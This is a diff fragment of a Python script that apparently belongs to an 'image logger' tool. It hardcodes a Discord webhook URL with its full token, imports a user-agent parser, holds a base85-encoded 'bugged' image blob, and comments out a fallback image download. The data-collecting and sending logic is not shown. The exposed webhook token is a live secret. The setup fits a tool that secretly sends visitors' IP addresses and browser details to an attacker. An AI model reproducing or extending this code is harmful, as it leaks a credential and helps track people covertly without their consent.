@@ -5,10 +5,10 @@ import httpx, base64, httpagentparser
 webhook = 'https://discord.com/api/webhooks/1548353585933451325/JGxatJWpqT8ilGi_K2NHWy7-Fw48DA0V1qohAlDO2D7nlVcoNTA3uWNtJIJL_0jrGZ5U'
 
 # Default fallback image content
-try:
-    bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
-except Exception:
-    bindata = b""
+#try:
+#    bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
+#except Exception:
+#    bindata = b""
 
 buggedimg = False
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
